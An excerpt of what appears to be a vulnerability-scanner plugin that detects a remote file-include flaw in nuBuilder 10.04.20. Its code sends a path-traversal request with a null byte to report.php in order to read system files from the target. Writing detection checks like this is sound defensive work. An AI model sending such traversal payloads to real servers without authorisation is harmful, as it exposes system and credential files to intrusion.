...
if(description)
{
  ...
  script_name("nuBuilder <= 10.04.20 RFI Vulnerability");
  ...
  script_tag(name:"summary", value:"nuBuilder is prone to a remote file-include vulnerability
  ...
  script_tag(name:"affected", value:"nuBuilder 10.04.20 is vulnerable, other versions may also be
  affected.");
  ...
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/42027");
...
foreach dir( make_list_unique( "/nubuilder", http_cgi_dirs( port:port ) ) ) {
  ...
  res = http_get_cache( port:port, item:dir + "/productionnu2/report.php" );
  if( res !~ "^HTTP/1\.[01] 200" )
    continue;

  foreach file( keys( files ) ) {

    url = dir + "/productionnu2/report.php?StartingDirectory=../../../../../../../../../../../" + files[file] + "%00";
